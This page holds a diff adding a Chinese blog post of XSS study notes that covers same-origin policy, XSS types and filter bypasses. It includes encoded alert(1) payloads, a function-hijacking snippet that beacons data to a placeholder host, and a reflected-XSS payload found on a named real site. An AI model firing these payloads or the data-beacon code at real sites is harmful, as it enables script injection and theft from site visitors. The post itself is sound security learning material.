@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+
+<title>XSS分析学习总结 | Love to share</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+
+
+</head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bentham&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bentham&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div id="post-toc" class="post-toc">
+            <span class="post-toc-title">catalogue</span>
+            <div class="post-toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是XSS？"><span class="toc-text">什么是XSS？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#首先理解跨站。-为什么说是跨站脚本攻击呢？"><span class="toc-text">首先理解跨站。 为什么说是跨站脚本攻击呢？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#什么算是同源？看如下"><span class="toc-text">什么算是同源？看如下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#同源策略限制并非是完全的，即有一些不受同源策略的限制"><span class="toc-text">同源策略限制并非是完全的，即有一些不受同源策略的限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#既然有同源策略的限制，那么加入a-com引用了b-com的js脚本就无法执行了吗？"><span class="toc-text">既然有同源策略的限制，那么加入a.com引用了b.com的js脚本就无法执行了吗？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS攻击的分类"><span class="toc-text">XSS攻击的分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#反射型XSS"><span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#存储型XSS"><span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DOM型XSS"><span class="toc-text">DOM型XSS</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS的漏洞挖掘"><span class="toc-text">XSS的漏洞挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML和javascript的自解码机制"><span class="toc-text">HTML和javascript的自解码机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#javascript函数劫持"><span class="toc-text">javascript函数劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML5新标签带来的隐患"><span class="toc-text">HTML5新标签带来的隐患</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一处反射XSS的挖掘"><span class="toc-text">一处反射XSS的挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></li>
+            </div>
+        </div>
+    
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">XSS分析学习总结</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">zhhhy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 2, 2019&nbsp;&nbsp;14:06:00</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <section class="post-content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从接触信安开始，就接触到了xss。无奈没有html的基础，又对javascript的不了解，一度对xss毫无理解力也无法利用。前段时间，再次（第三次）翻开《白帽子讲web安全》这本书。每次翻开这本书都有不一样的收获，原先可能无法理解的点，随着积累慢慢也能接受了。再结合《web前端黑客技术揭秘》把xss再学习了一次。便有了这篇总结。</p>
+<a id="more"></a>
+
+<h2 id="什么是XSS？"><a href="#什么是XSS？" class="headerlink" title="什么是XSS？"></a>什么是XSS？</h2><blockquote>
+<p>XSS攻击全称<a href="http://baike.baidu.com/item/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB" target="_blank" rel="noopener">跨站脚本攻击</a>，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。</p>
+</blockquote>
+<h3 id="首先理解跨站。-为什么说是跨站脚本攻击呢？"><a href="#首先理解跨站。-为什么说是跨站脚本攻击呢？" class="headerlink" title="首先理解跨站。 为什么说是跨站脚本攻击呢？"></a>首先理解跨站。 为什么说是跨站脚本攻击呢？</h3><p>又得再先谈谈，<strong><a href="https://www.cnblogs.com/rockmadman/p/6836834.html" target="_blank" rel="noopener">同源策略</a></strong></p>
+<p><strong>浏览器的最核心最基本的安全功能就是同源策略。</strong></p>
+<h4 id="什么算是同源？看如下"><a href="#什么算是同源？看如下" class="headerlink" title="什么算是同源？看如下"></a>什么算是同源？看如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">以下是相对于 http://www.a.com/test/index.html 的同源检测</span><br><span class="line">•	http://www.a.com/dir/page.html ----成功</span><br><span class="line">•	http://www.child.a.com/test/index.html ----失败，域名不同</span><br><span class="line">•	https://www.a.com/test/index.html ----失败，协议不同</span><br><span class="line">•	http://www.a.com:8080/test/index.html ----失败，端口号不同</span><br></pre></td></tr></table></figure>
+
+<p>总结可以发现，相同域名不同的文件路径可以算是同源。而域名不同，协议不同，端口不同都算是不同源。</p>
+<p>而同源策略就是，<strong>限制了不同源的脚本无法读写对方的资源。</strong>注意这里说的是读写。<br>《web前端黑客技术揭秘》介绍了web资源中一些资源的可读可写权限。例如，document.cookies就是可读可写，还有DOM树也是可读可写。当然，前提是要在同一源内。</p>
+<h4 id="同源策略限制并非是完全的，即有一些不受同源策略的限制"><a href="#同源策略限制并非是完全的，即有一些不受同源策略的限制" class="headerlink" title="同源策略限制并非是完全的，即有一些不受同源策略的限制"></a>同源策略限制并非是完全的，即有一些不受同源策略的限制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">•	不受同源策略限制的：</span><br><span class="line">1、页面中的链接，重定向以及表单提交是不会受到同源策略限制的。</span><br><span class="line">2、跨域资源的引入是可以的。但是js不能读写加载的内容。如嵌入到页面中的&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;，&lt;img&gt;，&lt;link&gt;，&lt;iframe&gt;等。</span><br></pre></td></tr></table></figure>
+
+<h4 id="既然有同源策略的限制，那么加入a-com引用了b-com的js脚本就无法执行了吗？"><a href="#既然有同源策略的限制，那么加入a-com引用了b-com的js脚本就无法执行了吗？" class="headerlink" title="既然有同源策略的限制，那么加入a.com引用了b.com的js脚本就无法执行了吗？"></a>既然有同源策略的限制，那么加入a.com引用了b.com的js脚本就无法执行了吗？</h4><p>先看看，如何引用b.com的js脚本。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#在a.com/a.html中有如下代码</span><br><span class="line">&lt;script src=<span class="string">'http://b.com/b.js'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>《白帽子讲web》中解释：当引入了b.com的js脚本时，由于是a.com引入的，则b.js的源是a.com而不是b.com。<strong>对于当前页面来说，页面内存放的javascript文件的域并不重要，重要的是加载javascript的页面所在域是什么</strong></p>
+<p>再回头看前面对资源的解释。例如document.cookies。既然b.js脚本是当前源的脚本，那么自然而然的可以出读取当前页面的cookie。</p>
+<p>于是，就有了一种情形，在b.com中的b.js写入窃取a.com中的cookie的脚本。所以跨站一词就到此解释完毕。（个人理解，可能不太对。）</p>
+<h2 id="XSS攻击的分类"><a href="#XSS攻击的分类" class="headerlink" title="XSS攻击的分类"></a>XSS攻击的分类</h2><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>​    《web前端黑客技术揭秘》<strong>解释:发出请求时，xss代码出现在URL中，作为输入代码提交到服务器，服务器解析后在相应内容出现这段代码，最后面浏览器解析执行</strong>。这种攻击多数需要诱导受害者点击链接等操作。</p>
+<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>​    存储型XSS会将而已的payload存储在服务端，以至于只要一次攻击成功，之后的受害者只要访问了带有payload的页面就会再一次攻击。也就是恶意代码只需要提交一次。</p>
+<h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>​    这种攻击并不提交到服务端，仅通过修改了DOM节点。而这完完全全是在客户端上发生的。表现出来的效果和反射型类似。</p>
+<h2 id="XSS的漏洞挖掘"><a href="#XSS的漏洞挖掘" class="headerlink" title="XSS的漏洞挖掘"></a>XSS的漏洞挖掘</h2><p>个人认为，xss类似sql注入都是一种代码注入。而既然是代码注入，它所能够达到的攻击效果是和注入的语言有关。同样的，在面对各种防御机制，依旧需要通过语言特性来进行绕过。网上关于xss的绕过方式有很多。这边只记录几个特性。</p>
+<h3 id="HTML和javascript的自解码机制"><a href="#HTML和javascript的自解码机制" class="headerlink" title="HTML和javascript的自解码机制"></a>HTML和javascript的自解码机制</h3><p><strong>在执行javascript代码之前，会进行一次自解码操作</strong></p>
+<p>布置一个html页面做几个小测试。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">##第一种触发事件以后，调用自定义函数，发现并没有自解码的效果。</span><br><span class="line">&lt;h1&gt;</span><br><span class="line">javascript 自解码问题</span><br><span class="line">&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">&lt;h3 id='test'&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>h3&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">var</span> v = <span class="built_in">document</span>.getElementById(<span class="string">'demo'</span>).value;</span><br><span class="line">	<span class="built_in">document</span>.getElementById(<span class="string">'test'</span>).innerHTML = v;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;input type=text id ='demo'&gt;</span></span><br><span class="line"><span class="regexp">&lt;input type=submit onclick='test()'&gt;</span></span><br><span class="line"><span class="regexp">## 第二种</span></span><br><span class="line"><span class="regexp"> ##直接调用javascript自带的函数对html进行操作，可以看到 "&lt;&gt;即便被实体编码了，依旧执行了弹窗，也就是说在javascript对html编码进行了解码操作。</span></span><br><span class="line"><span class="regexp">&lt;input type=submit onclick='document.getElementById(&amp;quot;test&amp;quot;).innerHTML = &amp;quot&amp;lt;img src=s onerror=alert(1); /</span>&amp;gt&amp;quot;<span class="string">'&gt;</span></span><br><span class="line"><span class="string">##</span></span><br><span class="line"><span class="string">所以在如下情况，可控部分即便进行了html编码，也是无法防御xss的</span></span><br><span class="line"><span class="string">&lt;input type=submit onclick='</span>可控部分<span class="string">'&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>从上面的代码可以发现一攻击方式。 绕过了html编码的防御。 以上是html的自解码机制</p>
+<p>《web前端黑客技术揭秘》还提到了<code>\&lt;img src\=s onerror=alert\(1\) \/\&gt;</code> 这种方式的转义。这种是完全无效的，即便添加了这样的转义，在javascript中执行的时候，会自动去转义。这是因为在javascript的上下文中，遵循javascript的语法。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">s</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> /&gt;</span> unicode加密后会是如下，在javascript中会自动解码，并且执行。</span><br><span class="line">http://www.msxindl.com/tools/unicode16.asp</span><br><span class="line">一定要是unicode \u这种形式的</span><br><span class="line">\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0073\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u0020\u002f\u003e\u0020</span><br><span class="line">十六进制</span><br><span class="line">\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x73\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x20\x2f\x3e\x20</span><br></pre></td></tr></table></figure>
+
+<h3 id="javascript函数劫持"><a href="#javascript函数劫持" class="headerlink" title="javascript函数劫持"></a>javascript函数劫持</h3><p>这个地方的理解有些点没有理解透彻，例如，我如何将一个函数进行劫持？是否有可能在存在XSS之后，插入了一段javascript代码进行函数劫持从而改写函数的用法，盗取数据信息呢？在尝试解决以上问题，并没找到一个很好的方法，而网上大多只是写了原理，<strong>即在调用目标函数之前，改写该函数</strong>。</p>
+<p><strong>函数劫持的本质就是对函数改写</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">    img.style.width = img.style.height = <span class="number">0</span>;</span><br><span class="line">    img.src = <span class="string">"http://www.xxx.xx?xxx="</span> + <span class="built_in">encodeURIComponent</span>(s);</span><br><span class="line">&#125;</span><br><span class="line">###劫持alert函数</span><br><span class="line"><span class="keyword">var</span> _alert = alert;</span><br><span class="line"><span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">   ## 弹窗之前记录信息</span><br><span class="line">    log(alert.caller);</span><br><span class="line">    _alert(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上代码可以写入在网页，可以监控到跨站测试者的攻击信息。其他代码可以发挥想象力构造。</p>
+<h3 id="HTML5新标签带来的隐患"><a href="#HTML5新标签带来的隐患" class="headerlink" title="HTML5新标签带来的隐患"></a>HTML5新标签带来的隐患</h3><p>HTML5带来了很多新特性，新标签。使得过去很多基于标签黑名单的防御机制失效。</p>
+<h2 id="一处反射XSS的挖掘"><a href="#一处反射XSS的挖掘" class="headerlink" title="一处反射XSS的挖掘"></a>一处反射XSS的挖掘</h2><p>这处漏洞很小，报给补天还不收。。:（</p>
+<p>懒得截图，简单的记一下思路。目标网址：<a href="http://ss.chaoxing.com/" target="_blank" rel="noopener">http://ss.chaoxing.com/</a></p>
+<p>输入内容，发现输入的内容会保持在搜索框里。一个想法就是按DOM型XSS去闭合一下搜索框来挖掘。</p>
+<p>观察一下，会发现输出点有很多，不过大多都在html标签里，被输出成属性值。测试之后，无法使用引号闭合属性值的引号，当&lt;&gt;一起出现时会被过滤。过滤的方式是整个标签被删除.例如<code>&lt;aa&gt;</code>。</p>
+<p>最后发现如下输出点word。这输出点对引号没有过滤，使用&gt;&lt;这种方式即可绕过对符号的处理。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://image.baidu.com/i?tn=baiduimage&amp;ipn=r&amp;ct=201326592&amp;cl=2&amp;lm=-1&amp;st=-1&amp;fm=index&amp;fr=&amp;sf=1&amp;fmq=&amp;pv=&amp;ic=0&amp;nc=1&amp;z=&amp;se=1&amp;showtab=0&amp;fb=0&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;ie=utf-8&amp;word=ZHIOYHIOHohoiho&amp;oq=web&amp;rsp=-1"</span></span></span><br><span class="line"><span class="tag">               <span class="attr">id</span>=<span class="string">'picId'</span> <span class="attr">style</span>=<span class="string">'display:none;'</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>图片<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">               </span><br><span class="line"> <span class="comment">&lt;!--  输入payload</span></span><br><span class="line"><span class="comment">	a"&gt;&lt;img src=a onerror=alert(1);//</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"> </span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://image.baidu.com/i?tn=baiduimage&amp;ipn=r&amp;ct=201326592&amp;cl=2&amp;lm=-1&amp;st=-1&amp;fm=index&amp;fr=&amp;sf=1&amp;fmq=&amp;pv=&amp;ic=0&amp;nc=1&amp;z=&amp;se=1&amp;showtab=0&amp;fb=0&amp;width=&amp;height=&amp;face=0&amp;istype=2&amp;ie=utf-8&amp;word=a"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">a</span> <span class="attr">onerror</span>=<span class="string">alert(1);//&amp;oq</span>=<span class="string">web&amp;rsp</span>=<span class="string">-1</span>"</span></span><br><span class="line"><span class="tag">               <span class="attr">id</span>=<span class="string">'picId'</span> <span class="attr">style</span>=<span class="string">'display:none;'</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>图片<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>其实不管是哪种类型的XSS，构造的方式基本相同。只不过是由于存储形式的不同导致与危害的不同。对这个的xss的挖掘过程还是很高兴的。在觉得毫无希望的时候，找到了关键的输出点。</p>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>zhhhy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://yoursite.com/2019/04/02/learn-xss1/">http://yoursite.com/2019/04/02/learn-xss1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Solgan:</span>
+                         <span>Do you believe in <strong>DESTINY<strong>?</strong></strong></span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/xss/"># xss</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/04/02/spider/">爬虫学习之urllib、requests、BeautifulSoup</a>
+            
+            
+            <a class="next" rel="next" href="/2019/04/02/linux-user/">Linux 用户和用户管理知识</a>
+            
+        </section>
+
+
+    </article>
+</div>
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© zhhhy | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Sirice19/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+    </div>
+</body>
+</html>
